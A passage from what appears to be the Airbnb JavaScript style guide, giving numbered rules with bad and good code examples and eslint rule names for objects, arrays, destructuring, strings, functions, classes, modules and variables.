eslint: object-shorthand\n// bad\nconst atom = {\n  value: 1,\n\n  addValue: function (value) {\n    return atom.value + value;\n  },\n};\n\n// good\nconst atom = {\n  value: 1,\n\n  addValue(value) {\n    return atom.value + value;\n  },\n};\n\n\n\n\n\n3.4 Use property value shorthand. eslint: object-shorthand\n\nWhy? It is shorter and descriptive.\n\nconst lukeSkywalker = 'Luke Skywalker';\n\n// bad\nconst obj = {\n  lukeSkywalker: lukeSkywalker,\n};\n\n// good\nconst obj = {\n  lukeSkywalker,\n};\n\n\n\n\n\n3.5 Group your shorthand properties at the beginning of your object declaration.\n\nWhy? It\u2019s easier to tell which properties are using the shorthand.\n\nconst anakinSkywalker = 'Anakin Skywalker';\nconst lukeSkywalker = 'Luke Skywalker';\n\n// bad\nconst obj = {\n  episodeOne: 1,\n  twoJediWalkIntoACantina: 2,\n  lukeSkywalker,\n  episodeThree: 3,\n  mayTheFourth: 4,\n  anakinSkywalker,\n};\n\n// good\nconst obj = {\n  lukeSkywalker,\n  anakinSkywalker,\n  episodeOne: 1,\n  twoJediWalkIntoACantina: 2,\n  episodeThree: 3,\n  mayTheFourth: 4,\n};\n\n\n\n\n\n3.6 Only quote properties that are invalid identifiers. eslint: quote-props\n\nWhy? In general we consider it subjectively easier to read. It improves syntax highlighting, and is also more easily optimized by many JS engines.\n\n// bad\nconst bad = {\n  'foo': 3,\n  'bar': 4,\n  'data-blah': 5,\n};\n\n// good\nconst good = {\n  foo: 3,\n  bar: 4,\n  'data-blah': 5,\n};\n\n\n\n\n\n3.7 Do not call Object.prototype methods directly, such as hasOwnProperty, propertyIsEnumerable, and isPrototypeOf. eslint: no-prototype-builtins\n\nWhy? These methods may be shadowed by properties on the object in question - consider { hasOwnProperty: false } - or, the object may be a null object (Object.create(null)).\n\n// bad\nconsole.log(object.hasOwnProperty(key));\n\n// good\nconsole.log(Object.prototype.hasOwnProperty.call(object, key));\n\n// best\nconst has = Object.prototype.hasOwnProperty; // cache the lookup once, in module scope.\n/* or */\nimport has from 'has'; // https://www.npmjs.com/package/has\n// ...\nconsole.log(has.call(object, key));\n\n\n\n\n\n3.8 Prefer the object spread operator over Object.assign to shallow-copy objects. Use the object rest operator to get a new object with certain properties omitted.\n// very bad\nconst original = { a: 1, b: 2 };\nconst copy = Object.assign(original, { c: 3 }); // this mutates `original` \u0ca0_\u0ca0\ndelete copy.a; // so does this\n\n// bad\nconst original = { a: 1, b: 2 };\nconst copy = Object.assign({}, original, { c: 3 }); // copy => { a: 1, b: 2, c: 3 }\n\n// good\nconst original = { a: 1, b: 2 };\nconst copy = { ...original, c: 3 }; // copy => { a: 1, b: 2, c: 3 }\n\nconst { a, ...noA } = copy; // noA => { b: 2, c: 3 }\n\n\n\u2b06 back to top\nArrays\n\n\n\n4.1 Use the literal syntax for array creation. eslint: no-array-constructor\n// bad\nconst items = new Array();\n\n// good\nconst items = [];\n\n\n\n\n\n4.2 Use Array#push instead of direct assignment to add items to an array.\nconst someStack = [];\n\n// bad\nsomeStack[someStack.length] = 'abracadabra';\n\n// good\nsomeStack.push('abracadabra');\n\n\n\n\n\n4.3 Use array spreads ... to copy arrays.\n// bad\nconst len = items.length;\nconst itemsCopy = [];\nlet i;\n\nfor (i = 0; i < len; i += 1) {\n  itemsCopy[i] = items[i];\n}\n\n// good\nconst itemsCopy = [...items];\n\n\n\n\n\n\n4.4 To convert an iterable object to an array, use spreads ... instead of Array.from.\nconst foo = document.querySelectorAll('.foo');\n\n// good\nconst nodes = Array.from(foo);\n\n// best\nconst nodes = [...foo];\n\n\n\n\n\n4.5 Use Array.from for converting an array-like object to an array.\nconst arrLike = { 0: 'foo', 1: 'bar', 2: 'baz', length: 3 };\n\n// bad\nconst arr = Array.prototype.slice.call(arrLike);\n\n// good\nconst arr = Array.from(arrLike);\n\n\n\n\n\n4.6 Use Array.from instead of spread ... for mapping over iterables, because it avoids creating an intermediate array.\n// bad\nconst baz = [...foo].map(bar);\n\n// good\nconst baz = Array.from(foo, bar);\n\n\n\n\n\n4.7 Use return statements in array method callbacks. It\u2019s ok to omit the return if the function body consists of a single statement returning an expression without side effects, following 8.2. eslint: array-callback-return\n// good\n[1, 2, 3].map((x) => {\n  const y = x + 1;\n  return x * y;\n});\n\n// good\n[1, 2, 3].map(x => x + 1);\n\n// bad - no returned value means `acc` becomes undefined after the first iteration\n[[0, 1], [2, 3], [4, 5]].reduce((acc, item, index) => {\n  const flatten = acc.concat(item);\n});\n\n// good\n[[0, 1], [2, 3], [4, 5]].reduce((acc, item, index) => {\n  const flatten = acc.concat(item);\n  return flatten;\n});\n\n// bad\ninbox.filter((msg) => {\n  const { subject, author } = msg;\n  if (subject === 'Mockingbird') {\n    return author === 'Harper Lee';\n  } else {\n    return false;\n  }\n});\n\n// good\ninbox.filter((msg) => {\n  const { subject, author } = msg;\n  if (subject === 'Mockingbird') {\n    return author === 'Harper Lee';\n  }\n\n  return false;\n});\n\n\n\n\n\n4.8 Use line breaks after open and before close array brackets if an array has multiple lines\n// bad\nconst arr = [\n  [0, 1], [2, 3], [4, 5],\n];\n\nconst objectInArray = [{\n  id: 1,\n}, {\n  id: 2,\n}];\n\nconst numberInArray = [\n  1, 2,\n];\n\n// good\nconst arr = [[0, 1], [2, 3], [4, 5]];\n\nconst objectInArray = [\n  {\n    id: 1,\n  },\n  {\n    id: 2,\n  },\n];\n\nconst numberInArray = [\n  1,\n  2,\n];\n\n\n\u2b06 back to top\nDestructuring\n\n\n\n5.1 Use object destructuring when accessing and using multiple properties of an object. eslint: prefer-destructuring\n\nWhy? Destructuring saves you from creating temporary references for those properties.\n\n// bad\nfunction getFullName(user) {\n  const firstName = user.firstName;\n  const lastName = user.lastName;\n\n  return `${firstName} ${lastName}`;\n}\n\n// good\nfunction getFullName(user) {\n  const { firstName, lastName } = user;\n  return `${firstName} ${lastName}`;\n}\n\n// best\nfunction getFullName({ firstName, lastName }) {\n  return `${firstName} ${lastName}`;\n}\n\n\n\n\n\n5.2 Use array destructuring. eslint: prefer-destructuring\nconst arr = [1, 2, 3, 4];\n\n// bad\nconst first = arr[0];\nconst second = arr[1];\n\n// good\nconst [first, second] = arr;\n\n\n\n\n\n5.3 Use object destructuring for multiple return values, not array destructuring.\n\nWhy? You can add new properties over time or change the order of things without breaking call sites.\n\n// bad\nfunction processInput(input) {\n  // then a miracle occurs\n  return [left, right, top, bottom];\n}\n\n// the caller needs to think about the order of return data\nconst [left, __, top] = processInput(input);\n\n// good\nfunction processInput(input) {\n  // then a miracle occurs\n  return { left, right, top, bottom };\n}\n\n// the caller selects only the data they need\nconst { left, top } = processInput(input);\n\n\n\u2b06 back to top\nStrings\n\n\n\n6.1 Use single quotes '' for strings. eslint: quotes\n// bad\nconst name = \"Capt. Janeway\";\n\n// bad - template literals should contain interpolation or newlines\nconst name = `Capt. Janeway`;\n\n// good\nconst name = 'Capt. Janeway';\n\n\n\n\n\n6.2 Strings that cause the line to go over 100 characters should not be written across multiple lines using string concatenation.\n\nWhy? Broken strings are painful to work with and make code less searchable.\n\n// bad\nconst errorMessage = 'This is a super long error that was thrown because \\\nof Batman. When you stop to think about how Batman had anything to do \\\nwith this, you would get nowhere \\\nfast.';\n\n// bad\nconst errorMessage = 'This is a super long error that was thrown because ' +\n  'of Batman. When you stop to think about how Batman had anything to do ' +\n  'with this, you would get nowhere fast.';\n\n// good\nconst errorMessage = 'This is a super long error that was thrown because of Batman. When you stop to think about how Batman had anything to do with this, you would get nowhere fast.';\n\n\n\n\n\n6.3 When programmatically building up strings, use template strings instead of concatenation. eslint: prefer-template template-curly-spacing\n\nWhy? Template strings give you a readable, concise syntax with proper newlines and string interpolation features.\n\n// bad\nfunction sayHi(name) {\n  return 'How are you, ' + name + '?';\n}\n\n// bad\nfunction sayHi(name) {\n  return ['How are you, ', name, '?'].join();\n}\n\n// bad\nfunction sayHi(name) {\n  return `How are you, ${ name }?`;\n}\n\n// good\nfunction sayHi(name) {\n  return `How are you, ${name}?`;\n}\n\n\n\n\n6.4 Never use eval() on a string, it opens too many vulnerabilities. eslint: no-eval\n\n\n\n\n6.5 Do not unnecessarily escape characters in strings. eslint: no-useless-escape\n\nWhy? Backslashes harm readability, thus they should only be present when necessary.\n\n// bad\nconst foo = '\\'this\\' \\i\\s \\\"quoted\\\"';\n\n// good\nconst foo = '\\'this\\' is \"quoted\"';\nconst foo = `my name is '${name}'`;\n\n\n\u2b06 back to top\nFunctions\n\n\n\n7.1 Use named function expressions instead of function declarations. eslint: func-style\n\nWhy? Function declarations are hoisted, which means that it\u2019s easy - too easy - to reference the function before it is defined in the file. This harms readability and maintainability. If you find that a function\u2019s definition is large or complex enough that it is interfering with understanding the rest of the file, then perhaps it\u2019s time to extract it to its own module! Don\u2019t forget to explicitly name the expression, regardless of whether or not the name is inferred from the containing variable (which is often the case in modern browsers or when using compilers such as Babel). This eliminates any assumptions made about the Error\u2019s call stack. (Discussion)\n\n// bad\nfunction foo() {\n  // ...\n}\n\n// bad\nconst foo = function () {\n  // ...\n};\n\n// good\n// lexical name distinguished from the variable-referenced invocation(s)\nconst short = function longUniqueMoreDescriptiveLexicalFoo() {\n  // ...\n};\n\n\n\n\n\n7.2 Wrap immediately invoked function expressions in parentheses. eslint: wrap-iife\n\nWhy? An immediately invoked function expression is a single unit - wrapping both it, and its invocation parens, in parens, cleanly expresses this. Note that in a world with modules everywhere, you almost never need an IIFE.\n\n// immediately-invoked function expression (IIFE)\n(function () {\n  console.log('Welcome to the Internet. Please follow me.');\n}());\n\n\n\n\n7.3 Never declare a function in a non-function block (if, while, etc). Assign the function to a variable instead. Browsers will allow you to do it, but they all interpret it differently, which is bad news bears. eslint: no-loop-func\n\n\n\n\n7.4 Note: ECMA-262 defines a block as a list of statements. A function declaration is not a statement.\n// bad\nif (currentUser) {\n  function test() {\n    console.log('Nope.');\n  }\n}\n\n// good\nlet test;\nif (currentUser) {\n  test = () => {\n    console.log('Yup.');\n  };\n}\n\n\n\n\n\n7.5 Never name a parameter arguments. This will take precedence over the arguments object that is given to every function scope.\n// bad\nfunction foo(name, options, arguments) {\n  // ...\n}\n\n// good\nfunction foo(name, options, args) {\n  // ...\n}\n\n\n\n\n\n7.6 Never use arguments, opt to use rest syntax ... instead. eslint: prefer-rest-params\n\nWhy? ... is explicit about which arguments you want pulled. Plus, rest arguments are a real Array, and not merely Array-like like arguments.\n\n// bad\nfunction concatenateAll() {\n  const args = Array.prototype.slice.call(arguments);\n  return args.join('');\n}\n\n// good\nfunction concatenateAll(...args) {\n  return args.join('');\n}\n\n\n\n\n\n7.7 Use default parameter syntax rather than mutating function arguments.\n// really bad\nfunction handleThings(opts) {\n  // No! We shouldn\u2019t mutate function arguments.\n  // Double bad: if opts is falsy it'll be set to an object which may\n  // be what you want but it can introduce subtle bugs.\n  opts = opts || {};\n  // ...\n}\n\n// still bad\nfunction handleThings(opts) {\n  if (opts === void 0) {\n    opts = {};\n  }\n  // ...\n}\n\n// good\nfunction handleThings(opts = {}) {\n  // ...\n}\n\n\n\n\n\n7.8 Avoid side effects with default parameters.\n\nWhy? They are confusing to reason about.\n\nvar b = 1;\n// bad\nfunction count(a = b++) {\n  console.log(a);\n}\ncount();  // 1\ncount();  // 2\ncount(3); // 3\ncount();  // 3\n\n\n\n\n\n7.9 Always put default parameters last.\n// bad\nfunction handleThings(opts = {}, name) {\n  // ...\n}\n\n// good\nfunction handleThings(name, opts = {}) {\n  // ...\n}\n\n\n\n\n\n7.10 Never use the Function constructor to create a new function. eslint: no-new-func\n\nWhy? Creating a function in this way evaluates a string similarly to eval(), which opens vulnerabilities.\n\n// bad\nvar add = new Function('a', 'b', 'return a + b');\n\n// still bad\nvar subtract = Function('a', 'b', 'return a - b');\n\n\n\n\n\n7.11 Spacing in a function signature. eslint: space-before-function-paren space-before-blocks\n\nWhy? Consistency is good, and you shouldn\u2019t have to add or remove a space when adding or removing a name.\n\n// bad\nconst f = function(){};\nconst g = function (){};\nconst h = function() {};\n\n// good\nconst x = function () {};\nconst y = function a() {};\n\n\n\n\n\n7.12 Never mutate parameters. eslint: no-param-reassign\n\nWhy? Manipulating objects passed in as parameters can cause unwanted variable side effects in the original caller.\n\n// bad\nfunction f1(obj) {\n  obj.key = 1;\n}\n\n// good\nfunction f2(obj) {\n  const key = Object.prototype.hasOwnProperty.call(obj, 'key') ? obj.key : 1;\n}\n\n\n\n\n\n7.13 Never reassign parameters. eslint: no-param-reassign\n\nWhy? Reassigning parameters can lead to unexpected behavior, especially when accessing the arguments object. It can also cause optimization issues, especially in V8.\n\n// bad\nfunction f1(a) {\n  a = 1;\n  // ...\n}\n\nfunction f2(a) {\n  if (!a) { a = 1; }\n  // ...\n}\n\n// good\nfunction f3(a) {\n  const b = a || 1;\n  // ...\n}\n\nfunction f4(a = 1) {\n  // ...\n}\n\n\n\n\n\n7.14 Prefer the use of the spread operator ... to call variadic functions. eslint: prefer-spread\n\nWhy? It\u2019s cleaner, you don\u2019t need to supply a context, and you can not easily compose new with apply.\n\n// bad\nconst x = [1, 2, 3, 4, 5];\nconsole.log.apply(console, x);\n\n// good\nconst x = [1, 2, 3, 4, 5];\nconsole.log(...x);\n\n// bad\nnew (Function.prototype.bind.apply(Date, [null, 2016, 8, 5]));\n\n// good\nnew Date(...[2016, 8, 5]);\n\n\n\n\n\n7.15 Functions with multiline signatures, or invocations, should be indented just like every other multiline list in this guide: with each item on a line by itself, with a trailing comma on the last item. eslint: function-paren-newline\n// bad\nfunction foo(bar,\n             baz,\n             quux) {\n  // ...\n}\n\n// good\nfunction foo(\n  bar,\n  baz,\n  quux,\n) {\n  // ...\n}\n\n// bad\nconsole.log(foo,\n  bar,\n  baz);\n\n// good\nconsole.log(\n  foo,\n  bar,\n  baz,\n);\n\n\n\u2b06 back to top\nArrow Functions\n\n\n\n8.1 When you must use an anonymous function (as when passing an inline callback), use arrow function notation. eslint: prefer-arrow-callback, arrow-spacing\n\nWhy? It creates a version of the function that executes in the context of this, which is usually what you want, and is a more concise syntax.\n\n\nWhy not? If you have a fairly complicated function, you might move that logic out into its own named function expression.\n\n// bad\n[1, 2, 3].map(function (x) {\n  const y = x + 1;\n  return x * y;\n});\n\n// good\n[1, 2, 3].map((x) => {\n  const y = x + 1;\n  return x * y;\n});\n\n\n\n\n\n8.2 If the function body consists of a single statement returning an expression without side effects, omit the braces and use the implicit return. Otherwise, keep the braces and use a return statement. eslint: arrow-parens, arrow-body-style\n\nWhy? Syntactic sugar. It reads well when multiple functions are chained together.\n\n// bad\n[1, 2, 3].map(number => {\n  const nextNumber = number + 1;\n  `A string containing the ${nextNumber}.`;\n});\n\n// good\n[1, 2, 3].map(number => `A string containing the ${number + 1}.`);\n\n// good\n[1, 2, 3].map((number) => {\n  const nextNumber = number + 1;\n  return `A string containing the ${nextNumber}.`;\n});\n\n// good\n[1, 2, 3].map((number, index) => ({\n  [index]: number,\n}));\n\n// No implicit return with side effects\nfunction foo(callback) {\n  const val = callback();\n  if (val === true) {\n    // Do something if callback returns true\n  }\n}\n\nlet bool = false;\n\n// bad\nfoo(() => bool = true);\n\n// good\nfoo(() => {\n  bool = true;\n});\n\n\n\n\n\n8.3 In case the expression spans over multiple lines, wrap it in parentheses for better readability.\n\nWhy? It shows clearly where the function starts and ends.\n\n// bad\n['get', 'post', 'put'].map(httpMethod => Object.prototype.hasOwnProperty.call(\n    httpMagicObjectWithAVeryLongName,\n    httpMethod,\n  )\n);\n\n// good\n['get', 'post', 'put'].map(httpMethod => (\n  Object.prototype.hasOwnProperty.call(\n    httpMagicObjectWithAVeryLongName,\n    httpMethod,\n  )\n));\n\n\n\n\n\n8.4 If your function takes a single argument and doesn\u2019t use braces, omit the parentheses. Otherwise, always include parentheses around arguments for clarity and consistency. Note: it is also acceptable to always use parentheses, in which case use the \u201calways\u201d option for eslint. eslint: arrow-parens\n\nWhy? Less visual clutter.\n\n// bad\n[1, 2, 3].map((x) => x * x);\n\n// good\n[1, 2, 3].map(x => x * x);\n\n// good\n[1, 2, 3].map(number => (\n  `A long string with the ${number}. It\u2019s so long that we don\u2019t want it to take up space on the .map line!`\n));\n\n// bad\n[1, 2, 3].map(x => {\n  const y = x + 1;\n  return x * y;\n});\n\n// good\n[1, 2, 3].map((x) => {\n  const y = x + 1;\n  return x * y;\n});\n\n\n\n\n\n8.5 Avoid confusing arrow function syntax (=>) with comparison operators (<=, >=). eslint: no-confusing-arrow\n// bad\nconst itemHeight = item => item.height <= 256 ? item.largeSize : item.smallSize;\n\n// bad\nconst itemHeight = (item) => item.height >= 256 ? item.largeSize : item.smallSize;\n\n// good\nconst itemHeight = item => (item.height <= 256 ? item.largeSize : item.smallSize);\n\n// good\nconst itemHeight = (item) => {\n  const { height, largeSize, smallSize } = item;\n  return height <= 256 ? largeSize : smallSize;\n};\n\n\n\n\n\n8.6 Enforce the location of arrow function bodies with implicit returns. eslint: implicit-arrow-linebreak\n// bad\nfoo =>\n  bar;\n\nfoo =>\n  (bar);\n\n// good\nfoo => bar;\nfoo => (bar);\nfoo => (\n   bar\n)\n\n\n\u2b06 back to top\nClasses & Constructors\n\n\n\n9.1 Always use class. Avoid manipulating prototype directly.\n\nWhy? class syntax is more concise and easier to reason about.\n\n// bad\nfunction Queue(contents = []) {\n  this.queue = [...contents];\n}\nQueue.prototype.pop = function () {\n  const value = this.queue[0];\n  this.queue.splice(0, 1);\n  return value;\n};\n\n// good\nclass Queue {\n  constructor(contents = []) {\n    this.queue = [...contents];\n  }\n  pop() {\n    const value = this.queue[0];\n    this.queue.splice(0, 1);\n    return value;\n  }\n}\n\n\n\n\n\n9.2 Use extends for inheritance.\n\nWhy? It is a built-in way to inherit prototype functionality without breaking instanceof.\n\n// bad\nconst inherits = require('inherits');\nfunction PeekableQueue(contents) {\n  Queue.apply(this, contents);\n}\ninherits(PeekableQueue, Queue);\nPeekableQueue.prototype.peek = function () {\n  return this.queue[0];\n};\n\n// good\nclass PeekableQueue extends Queue {\n  peek() {\n    return this.queue[0];\n  }\n}\n\n\n\n\n\n9.3 Methods can return this to help with method chaining.\n// bad\nJedi.prototype.jump = function () {\n  this.jumping = true;\n  return true;\n};\n\nJedi.prototype.setHeight = function (height) {\n  this.height = height;\n};\n\nconst luke = new Jedi();\nluke.jump(); // => true\nluke.setHeight(20); // => undefined\n\n// good\nclass Jedi {\n  jump() {\n    this.jumping = true;\n    return this;\n  }\n\n  setHeight(height) {\n    this.height = height;\n    return this;\n  }\n}\n\nconst luke = new Jedi();\n\nluke.jump()\n  .setHeight(20);\n\n\n\n\n\n9.4 It\u2019s okay to write a custom toString() method, just make sure it works successfully and causes no side effects.\nclass Jedi {\n  constructor(options = {}) {\n    this.name = options.name || 'no name';\n  }\n\n  getName() {\n    return this.name;\n  }\n\n  toString() {\n    return `Jedi - ${this.getName()}`;\n  }\n}\n\n\n\n\n\n9.5 Classes have a default constructor if one is not specified. An empty constructor function or one that just delegates to a parent class is unnecessary. eslint: no-useless-constructor\n// bad\nclass Jedi {\n  constructor() {}\n\n  getName() {\n    return this.name;\n  }\n}\n\n// bad\nclass Rey extends Jedi {\n  constructor(...args) {\n    super(...args);\n  }\n}\n\n// good\nclass Rey extends Jedi {\n  constructor(...args) {\n    super(...args);\n    this.name = 'Rey';\n  }\n}\n\n\n\n\n\n9.6 Avoid duplicate class members. eslint: no-dupe-class-members\n\nWhy? Duplicate class member declarations will silently prefer the last one - having duplicates is almost certainly a bug.\n\n// bad\nclass Foo {\n  bar() { return 1; }\n  bar() { return 2; }\n}\n\n// good\nclass Foo {\n  bar() { return 1; }\n}\n\n// good\nclass Foo {\n  bar() { return 2; }\n}\n\n\n\u2b06 back to top\nModules\n\n\n\n10.1 Always use modules (import/export) over a non-standard module system. You can always transpile to your preferred module system.\n\nWhy? Modules are the future, let\u2019s start using the future now.\n\n// bad\nconst AirbnbStyleGuide = require('./AirbnbStyleGuide');\nmodule.exports = AirbnbStyleGuide.es6;\n\n// ok\nimport AirbnbStyleGuide from './AirbnbStyleGuide';\nexport default AirbnbStyleGuide.es6;\n\n// best\nimport { es6 } from './AirbnbStyleGuide';\nexport default es6;\n\n\n\n\n\n10.2 Do not use wildcard imports.\n\nWhy? This makes sure you have a single default export.\n\n// bad\nimport * as AirbnbStyleGuide from './AirbnbStyleGuide';\n\n// good\nimport AirbnbStyleGuide from './AirbnbStyleGuide';\n\n\n\n\n\n10.3 And do not export directly from an import.\n\nWhy? Although the one-liner is concise, having one clear way to import and one clear way to export makes things consistent.\n\n// bad\n// filename es6.js\nexport { es6 as default } from './AirbnbStyleGuide';\n\n// good\n// filename es6.js\nimport { es6 } from './AirbnbStyleGuide';\nexport default es6;\n\n\n\n\n\n10.4 Only import from a path in one place.\neslint: no-duplicate-imports\n\nWhy? Having multiple lines that import from the same path can make code harder to maintain.\n\n// bad\nimport foo from 'foo';\n// \u2026 some other imports \u2026 //\nimport { named1, named2 } from 'foo';\n\n// good\nimport foo, { named1, named2 } from 'foo';\n\n// good\nimport foo, {\n  named1,\n  named2,\n} from 'foo';\n\n\n\n\n\n10.5 Do not export mutable bindings.\neslint: import/no-mutable-exports\n\nWhy? Mutation should be avoided in general, but in particular when exporting mutable bindings. While this technique may be needed for some special cases, in general, only constant references should be exported.\n\n// bad\nlet foo = 3;\nexport { foo };\n\n// good\nconst foo = 3;\nexport { foo };\n\n\n\n\n\n10.6 In modules with a single export, prefer default export over named export.\neslint: import/prefer-default-export\n\nWhy? To encourage more files that only ever export one thing, which is better for readability and maintainability.\n\n// bad\nexport function foo() {}\n\n// good\nexport default function foo() {}\n\n\n\n\n\n10.7 Put all imports above non-import statements.\neslint: import/first\n\nWhy? Since imports are hoisted, keeping them all at the top prevents surprising behavior.\n\n// bad\nimport foo from 'foo';\nfoo.init();\n\nimport bar from 'bar';\n\n// good\nimport foo from 'foo';\nimport bar from 'bar';\n\nfoo.init();\n\n\n\n\n\n10.8 Multiline imports should be indented just like multiline array and object literals.\n\nWhy? The curly braces follow the same indentation rules as every other curly brace block in the style guide, as do the trailing commas.\n\n// bad\nimport {longNameA, longNameB, longNameC, longNameD, longNameE} from 'path';\n\n// good\nimport {\n  longNameA,\n  longNameB,\n  longNameC,\n  longNameD,\n  longNameE,\n} from 'path';\n\n\n\n\n\n10.9 Disallow Webpack loader syntax in module import statements.\neslint: import/no-webpack-loader-syntax\n\nWhy? Since using Webpack syntax in the imports couples the code to a module bundler. Prefer using the loader syntax in webpack.config.js.\n\n// bad\nimport fooSass from 'css!sass!foo.scss';\nimport barCss from 'style!css!bar.css';\n\n// good\nimport fooSass from 'foo.scss';\nimport barCss from 'bar.css';\n\n\n\u2b06 back to top\nIterators and Generators\n\n\n\n11.1 Don\u2019t use iterators. Prefer JavaScript\u2019s higher-order functions instead of loops like for-in or for-of. eslint: no-iterator no-restricted-syntax\n\nWhy? This enforces our immutable rule. Dealing with pure functions that return values is easier to reason about than side effects.\n\n\nUse map() / every() / filter() / find() / findIndex() / reduce() / some() / ... to iterate over arrays, and Object.keys() / Object.values() / Object.entries() to produce arrays so you can iterate over objects.\n\nconst numbers = [1, 2, 3, 4, 5];\n\n// bad\nlet sum = 0;\nfor (let num of numbers) {\n  sum += num;\n}\nsum === 15;\n\n// good\nlet sum = 0;\nnumbers.forEach((num) => {\n  sum += num;\n});\nsum === 15;\n\n// best (use the functional force)\nconst sum = numbers.reduce((total, num) => total + num, 0);\nsum === 15;\n\n// bad\nconst increasedByOne = [];\nfor (let i = 0; i < numbers.length; i++) {\n  increasedByOne.push(numbers[i] + 1);\n}\n\n// good\nconst increasedByOne = [];\nnumbers.forEach((num) => {\n  increasedByOne.push(num + 1);\n});\n\n// best (keeping it functional)\nconst increasedByOne = numbers.map(num => num + 1);\n\n\n\n\n\n11.2 Don\u2019t use generators for now.\n\nWhy? They don\u2019t transpile well to ES5.\n\n\n\n\n\n\n11.3 If you must use generators, or if you disregard our advice, make sure their function signature is spaced properly. eslint: generator-star-spacing\n\nWhy? function and * are part of the same conceptual keyword - * is not a modifier for function, function* is a unique construct, different from function.\n\n// bad\nfunction * foo() {\n  // ...\n}\n\n// bad\nconst bar = function * () {\n  // ...\n};\n\n// bad\nconst baz = function *() {\n  // ...\n};\n\n// bad\nconst quux = function*() {\n  // ...\n};\n\n// bad\nfunction*foo() {\n  // ...\n}\n\n// bad\nfunction *foo() {\n  // ...\n}\n\n// very bad\nfunction\n*\nfoo() {\n  // ...\n}\n\n// very bad\nconst wat = function\n*\n() {\n  // ...\n};\n\n// good\nfunction* foo() {\n  // ...\n}\n\n// good\nconst foo = function* () {\n  // ...\n};\n\n\n\u2b06 back to top\nProperties\n\n\n\n12.1 Use dot notation when accessing properties. eslint: dot-notation\nconst luke = {\n  jedi: true,\n  age: 28,\n};\n\n// bad\nconst isJedi = luke['jedi'];\n\n// good\nconst isJedi = luke.jedi;\n\n\n\n\n\n12.2 Use bracket notation [] when accessing properties with a variable.\nconst luke = {\n  jedi: true,\n  age: 28,\n};\n\nfunction getProp(prop) {\n  return luke[prop];\n}\n\nconst isJedi = getProp('jedi');\n\n\n\n\n\n12.3 Use exponentiation operator ** when calculating exponentiations. eslint: no-restricted-properties.\n// bad\nconst binary = Math.pow(2, 10);\n\n// good\nconst binary = 2 ** 10;\n\n\n\u2b06 back to top\nVariables\n\n\n\n13.1 Always use const or let to declare variables. Not doing so will result in global variables. We want to avoid polluting the global namespace. Captain Planet warned us of that. eslint: no-undef prefer-const\n// bad\nsuperPower = new SuperPower();\n\n// good\nconst superPower = new SuperPower();\n\n\n\n\n\n13.2 Use one const or let declaration per variable or assignment. eslint: one-var\n\nWhy? It\u2019s easier to add new variable declarations this way, and you never have to worry about swapping out a ; for a , or introducing punctuation-only diffs. You can also step through each declaration with the debugger, instead of jumping through all of them at once.\n\n// bad\nconst items = getItems(),\n    goSportsTeam = true,\n    dragonball = 'z';\n\n// bad\n// (compare to above, and try to spot the mistake)\nconst items = getItems(),\n    goSportsTeam = true;\n    dragonball = 'z';\n\n// good\nconst items = getItems();\nconst goSportsTeam = true;\nconst dragonball = 'z';\n\n\n\n\n\n13.3 Group all your consts and then group all your lets.\n\nWhy? This is helpful when later on you might need to assign a variable depending on one of the previous assigned variables.\n\n// bad\nlet i, len, dragonball,\n    items = getItems(),\n    goSportsTeam = true;\n\n// bad\nlet i;\nconst items = getItems();\nlet dragonball;\nconst goSportsTeam = true;\nlet len;\n\n// good\nconst goSportsTeam = true;\nconst items = getItems();\nlet dragonball;\nlet i;\nlet length;\n\n\n\n\n\n13.4 Assign variables where you need them, but place them in a reasonable place.\n\nWhy? let and const are block scoped and not function scoped.\n\n// bad - unnecessary function call\nfunction checkName(hasName) {\n  const name = getName();\n\n  if (hasName === 'test') {\n    return false;\n  }\n\n  if (name === 'test') {\n    this.setName('');\n    return false;\n  }\n\n  return name;\n}\n\n// good\nfunction checkName(hasName) {\n  if (hasName === 'test') {\n    return false;\n  }\n\n  const name = getName();\n\n  if (name === 'test') {\n    this.setName('');\n    return false;\n  }\n\n  return name;\n}\n\n\n\n\n\n13.5 Don\u2019t chain variable assignments. eslint: no-multi-assign\n\nWhy? Chaining variable assignments creates implicit global variables.\n\n// bad\n(function example() {\n  // JavaScript interprets this as\n  // let a = ( b = ( c = 1 ) );\n  // The let keyword only applies to variable a; variables b and c become\n  // global variables.\n  let a = b = c = 1;\n}());\n\nconsole.log(a); // throws ReferenceError\nconsole.log(b); // 1\nconsole.log(c); // 1\n\n// good\n(function example() {\n  let a = 1;\n  let b = a;\n  let c = a;\n}());\n\nconsole.log(a); // throws ReferenceError\nconsole.log(b); // throws ReferenceError\nconsole.log(c); // throws ReferenceError\n\n// the same applies for `const`\n\n\n\n\n\n13.6 Avoid using unary increments and decrements (++, --). eslint no-plusplus\n\nWhy? Per the eslint documentation, unary increment and decrement statements are subject to automatic semicolon insertion and can cause silent errors with incrementing or decrementing values within an application. It is also more expressive to mutate your values with statements like num += 1 instead of num++ or num ++. Disallowing unary increment and decrement statements also prevents you from pre-incrementing/pre-decrementing values unintentionally which can also cause unexpected behavior in your programs.\n\n// bad\n\nconst array = [1, 2, 3];\nlet num = 1;\nnum++;\n--num;\n\nlet sum = 0;\nlet truthyCount = 0;\nfor (let i = 0; i < array.length; i++) {\n  let value = array[i];\n  sum += value;\n  if (value) {\n    truthyCount++;\n  }\n}\n\n// good\n\nconst array = [1, 2, 3];\nlet num = 1;\nnum += 1;\nnum -= 1;\n\nconst sum = array.reduce((a, b) => a + b, 0);\nconst truthyCount = array.filter(Boolean).length;\n\n\n\n\n\n13.7 Avoid linebreaks before or after = in an assignment. If your assignment violates max-len, surround the value in parens. eslint operator-linebreak.\n\nWhy? Linebreaks surrounding = can obfuscate the value of an assignment.\n\n// bad\nconst foo =\n  superLongLongLongLongLongLongLongLongFunctionName();\n\n// bad\nconst foo\n  = 'superLongLongLongLongLongLongLongLongString';\n\n// good\nconst foo = (\n  superLongLongLongLongLongLongLongLongFunctionName()\n);\n\n// good\nconst foo = 'superLongLongLongLongLongLongLongLongString';\n\n\n\n\n\n13.8 Disallow unused variables. eslint: no-unused-vars\n\nWhy? Variables that are declared and not used anywhere in the code are most likely an error due to incomplete refactoring. Such variables take up space in the code and can lead to confusion by readers.\n\n// bad\n\nvar some_unused_var = 42;\n\n// Write-only variables are not considered as used.\nvar y = 10;\ny = 5;\n\n// A read for a modification of itself is not considered as used.\nvar z = 0;\nz = z + 1;\n\n// Unused function arguments.\nfunction getX(x, y) {\n    return x;\n}\n\n// good\n\nfunction getXPlusY(x, y) {\n  return x + y;\n}\n\nvar x = 1;\nvar y = a + 2;\n\nalert(getXPlusY(x, y));\n\n// 'type' is ignored even if unused because it has a rest property sibling.\n// This is a form of extracting an object that omits the specified keys.\nvar { type, 